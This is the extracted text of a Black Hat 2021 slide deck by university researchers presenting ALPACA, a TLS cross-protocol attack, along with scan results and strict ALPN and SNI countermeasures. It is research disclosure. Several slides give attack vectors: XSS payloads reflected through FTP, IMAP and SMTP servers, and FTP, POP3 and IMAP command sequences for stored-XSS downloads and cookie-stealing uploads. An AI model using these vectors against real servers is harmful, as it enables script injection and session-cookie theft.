ALPACA: Application Layer Protocol Confusion

Analyzing and Mitigating Cracks in TLS Authentication

Black Hat USA Security Briefings 2021
Marcus Brinkmann,1 Christian Dresen,2 Robert Merget,1 Damian Poddebniak,2 Jens Müller,1 Juraj Somorovsky,3 Jörg Schwenk,1 Sebastian Schinzel2
1 Ruhr University Bochum 2 Münster University of Applied Sciences 3 Paderborn University
1

Transport Layer Security (TLS) and the WWW

TLS

HTTP www.blackhat.com

2

Transport Layer Security (TLS)

Application TLS
Transport
Internet
Network

HTTP

SMTP

FTP

POP3 ....

TLS can be used to secure any application layer protocol

3

Transport Layer Security (TLS) and Other Protocols

TLS TLS TLS

HTTP www.bank.com
FTP bank.com www.bank.com
POP3 *.bank.com

SMTP
IMAP 4

TLS Is Application Protocol Independent

RFC 5246

TLS

August 2008

One advantage of TLS is that it is application protocol independent. Higher-level protocols can layer on top of the TLS protocol transparently. The TLS standard, however, does not specify how protocols add security with TLS; the decisions on how to initiate TLS handshaking and how to interpret the authentication certificates exchanged are left to the judgment of the designers and implementors of protocols that run on top of TLS.

5

TLS Certificates in the Wild
IP address and port are not protected by TLS!
6

TLS-Based Cross-Protocol Attacks

GET /alpaca HTTP/1.1 Host: www.bank.com ...
GET /alpaca HTTP/1.1 Host: www.bank.com ...

HTTP www.bank.com
POP3 *.bank.com

7

Research Questions

What is the impact of cross-protocol attacks today?

How many servers are affected by cross-protocol attacks?

How can cross-protocol attacks be prevented?

8

Overview

Attack Idea

Attack Methods

Evaluation

Countermeasures

9

TLS-Based Cross-Protocol Attacks

S
Server S

Client

T
Server T

There are three attack methods
10

Reflection Attack (Reflected XSS)
<script>reflect()</script> <script>reflect()</script>

HTTP FTP
11

Download Attack (Stored XSS)
RETR stored-xss.html
HTTP/1.1 200 OK <script>stored()</script>

HTTP FTP
12

Upload Attack (with Cookie Stealing)
GET / Cookie: secret

HTTP
FTP GET / Cookie: secret
13

Attack Obstacles
Certificate compatibility TLS compatibility Application protocol needs to offer possibilities for upload / download / reflection

Protocol Noise
POST / Host: www.bank.com Cookie: secret LANG <script>alert("xss");</script>
Invalid command. Invalid command. Invalid command. 502 Language <script>alert("xss");</script> not supported.

14

Overview

Attack Idea

Attack Methods

Evaluation

Countermeasures

15

History and Potential of Cross-Protocol Attacks

HTTP (w/o TLS) Jochen Topf (2001), The HTML Form Protocol Attack
HTTPS (w/ TLS) * Jann Horn (2015), Two cross-protocol MitM attacks on browsers (With input from Michal Zalewski)

Intended Protocol
HTTP SMTP IMAP POP3 FTP ...

Substitute Protocol

With TLS

HTTP SMTP IMAP POP3

- This work.

*

-

Mostly

unexplored
- attack surface

-

FTP ...

Mostly unexplored attack surface

-

16

Reflection Attack on HTTPS Exploiting FTP (Jann Horn, 2015)

Origin: attacker.com

Cross-Origin HTTPS Request
POST / Host: www.bank.com
HELP <script>reflect()</script>

MitM

www.bank.com:443
HTTP *.bank.com

Origin: www.bank.com
reflect()

Cross-Protocol FTP Response
Unknown command: <script>reflect()</script>

ftp.bank.com:990
FTP *.bank.com

17

Example Reflection Attacks
Microsoft FTP Server - IIS 10.0.19041.322 (Windows 10)
 LANG <script>alert("xss");</script>  502 Language <script>alert("xss");</script> not supported.
Kerio Connect IMAP Server 9.3.0
 x <script>alert`xss`</script>  x BAD Unknown command '<script>alert`xss`</script>'
Sendmail SMTP Server 8.15.2
 <script>alert(1);</script>  500 5.5.1 Command unrecognized: "<script>alert(1);</script>"
18

Download Attack on HTTPS Exploiting FTP (Jann Horn, 2015)

Origin: attacker.com

Cross-Origin HTTPS Request
POST / Host: www.bank.com
PASV RETR stored.html

window.location = "https://www.bank.com"

Origin: www.bank.com
stored()

Cross-Protocol FTP Response
HTTP/1.1 200 OK
<script>stored()</script>

MitM

www.bank.com:443
HTTP *.bank.com
ftp.bank.com:990
FTP *.bank.com stored.html Data Port HTTP/1.1 200 OK <script>stored()</script>

19

Example Download Vectors

FTP (Generic)

POP3 (Generic)

IMAP (Generic)

USER attacker PASS S3cr3t TYPE I PASV RETR stored-xss.html

user attacker pass S3cr3t retr 1

A1 LOGIN attacker S3cr3t A2 SELECT "INBOX" A3 FETCH 1 rfc822

stored-xss.html
HTTP/1.1 200 OK
<!DOCTYPE html> <html><head></head><body> <script>alert(1);</script> </body>

INBOX
From: a@example.com To: b@example.com Subject: none Date: Thu, 15 Oct 2020 16:06:18 +0200 MIME-Version: 1.0 Content-Type: text/html; charset=utf-8 Content-Transfer-Encoding: 7bit
<script>alert(1);</script>

20

Upload Attack on HTTPS Exploiting FTP

Origin: attacker.com

Cross-Origin HTTPS Request
POST / Host: www.bank.com Cookie: secret
USER mrcat PASS 1234 PASV STOR cookie.txt

window.location = "https://www.bank.com"

MitM

www.bank.com:443
HTTP *.bank.com
ftp.bank.com:990
FTP *.bank.com

cookie.txt Data Port
GET / Host: www.bank.com Cookie: secret

21

Example Upload Vectors

FTP (Generic)
USER attacker PASS S3cr3t TYPE I PASV STOR cookie.html
cookie.html
HTTP/1.1 GET / Cookie: PHPSESSID=secret

IMAP (Generic)
A1 LOGIN attacker S3cr3t A2 SELECT "INBOX" A3 APPEND "INBOX" (\Seen) {448+} From: alice@example.com To: bob@example.com Date: Mon, 7 Feb 1994 21:52:25 -0800 (PST) Subject: afternoon meeting
INBOX
From: alice@example.com To: bob@example.com Date: Mon, 7 Feb 1994 21:52:25 -0800 (PST) Subject: afternoon meeting
HTTP/1.1 GET / Cookie: PHPSESSID=secret
22

Attack Methods and Protocols (Summary)

Attack Method

Upload Download Reflection

FTP

Application Protocol

SMTP

IMAP

POP3

23

Overview

Attack Idea

Attack Methods

Evaluation

Countermeasures

24

Protocol Noise

POST /

Host: www.bank.com

Cookie: secret

FTP

LANG <script>alert("xss");</script>

Invalid command.

Invalid command.

Invalid command.

FTP

502 Language <script>alert("xss");</script> not supported.

25

Noise Tolerance in Browsers
Not tolerant to protocol noise. Still possible:
 FTP Upload Attack  FTP Download Attack
Tolerant to protocol noise ("content-sniffing").  All attack methods possible.

Noise Tolerance in Servers
 Evaluated 24 application servers  Tested tolerance for:
 HTTP request methods  HTTP key:value pairs  Maximum number of syntax errors
27

Exploitability of Servers
 8 servers exploitable with browsers vulnerable to content sniffing ()
 4 servers exploitable in all browsers ()
 12 of 24 application servers can be exploited:
 for at least one attack method  with at least one browser
28

Internet-Wide Scan for Vulnerable Web Servers

FTP

SMTP

POP3

IMAP

Total number of application servers with TLS support (IPv4).
29

Internet-Wide Scan for Vulnerable Web Servers

FTP

POP3

Total number of application servers with valid certificates.
30

Internet-Wide Scan for Vulnerable Web Servers

FTP
ftp.bank.com *.bank.com

POP3
email.bank.com pop.bank.com

Unique hostnames in the Common Name (CN) and Subject Alternative Name (SAN) fields of all valid certificates.
31

Internet-Wide Scan for Vulnerable Web Servers

FTP
ftp.bank.com *.bank.com

POP3
email.bank.com pop.bank.com

HTTP
www.bank.com

Total number of web servers on port 443 among unique names (*=www). 1.4M web servers are vulnerable to a general TLS cross-protocol attack with at least one application server (SMTP, IMAP, POP3, or FTP).
32

Vulnerable Web Servers with Exploitable Application Servers

FTP
ftp.bank.com *.bank.com

For the 1.4M web servers, we tried to identify the application servers with a banner scan to see they are exploitable based on our lab eval.
114,197 web servers can be attacked with at least one exploitable application server.

HTTP
www.bank.com

33

One more thing...
34

Do We Need a Man-in-the-Middle?

TLS

https://blackhat.com:990

TLS

HTTP www.bank.com
FTP *.bank.com

35

ALPACA Without Man-in-the-Middle
Requirements:  Application server port is not blocked (e.g. FTPS 990).  Hostname is the same.  Browser ignores port in Same-Origin-Policy (e.g. Internet Explorer).
Fixed in IE with patch tuesday June 8, 2021:  More blocked ports.  HTTP content-sniffing disabled on non-standard port.
Other major browsers will also block more ports.

#bugbountyti3p6s

Overview

Attack Idea

Attack Methods

Evaluation

Countermeasures

37

Not Good Enough: Application Layer Countermeasures

Detect Protocols
 220 smtp.bank.com ESMTP Postfix  GET /  221 2.7.0 Error: I can break rules, too. Goodbye. Connection closed by foreign host.

Limit Syntax Errors
 220 smtp.bank.com ESMTP Exim  GET /  500 unrecognized command  Host: bank.com  500 unrecognized command  Connection: keep-alive  500 unrecognized command  Cache-Control: max-age=0  500 Too many unrecognized commands Connection closed by foreign host.

Avoid Reflection
 220 smtp.bank.com ESMTP sendmail  <script>alert(1);</script>  500 5.5.1 Command unrecognized: "<script>alert(1);</script>"

38

Not Practical: Certificate-Based Countermeasures

No Wildcard Certificates *.bank.com

No Multi-Domain Certificates
www.bank.com ftp.bank.com

No Shared Hostnames
bank.com:443 bank.com:990

39

Not Intended / Standardized: Key Usage Restrictions

RFC 5280:

id-kp-serverAuth

OBJECT IDENTIFIER ::= { id-kp 1 }

-- TLS WWW server authentication

-- keyEncipherment or keyAgreement

id-kp-clientAuth

OBJECT IDENTIFIER ::= { id-kp 2 }

-- TLS WWW client authentication

-- and/or keyAgreement

id-kp-codeSigning

OBJECT IDENTIFIER ::= { id-kp 3 }

-- Signing of downloadable executable code

id-kp-emailProtection

OBJECT IDENTIFIER ::= { id-kp 4 }

-- Email protection

-- nonRepudiation, and/or (keyEncipherment or keyAgreement)

id-kp-timeStamping

OBJECT IDENTIFIER ::= { id-kp 8 }

-- Binding the hash of an object to a time

-- and/or nonRepudiation

id-kp-OCSPSigning -- Signing OCSP responses -- and/or nonRepudiation

OBJECT IDENTIFIER ::= { id-kp 9 }

Only differentiates between client and server, no application protocol distinction possible.
40

Recommended: Strict Application Layer Protocol Negotiation (ALPN)

Server implements strict ALPN:
 Not exploitable on clients with ALPN (e.g., browsers).
 Backwards compatible: servers can accept connections without ALPN.
Client and server implement strict ALPN:
 Prevents known and unknown cross-protocol attacks.

ALPN http/1.1
h2

ALPN h2

HTTP

ALPN

FTP

41

Recommended: Strict Server Name Indication (SNI)

Server implements strict SNI:
 Cross-hostname attacks are prevented.
Works if hostnames differ: www.bank.com vs. ftp.bank.com
Also mitigates virtual host confusion attacks, see Delignat-Lavaud et al. (2015), Zhang et al. (2020).

SNI www.bank.com
SNI

HTTP www.bank.com

FTP SNI
ftp.bank.com
42

https://alpaca-attack.com/libs.html
43

Conclusions
Cross-protocol attacks are still possible today!
We found 114k web servers with an exploitable FTP or Email server.
Strict ALPN and SNI can prevent these attacks.
More cross-protocol attacks? Binary protocols, DTLS, IPsec, ...

Thank you for listening! Any questions?
alpaca-attack.com @lambdafu, @jurajsomorovsky
44

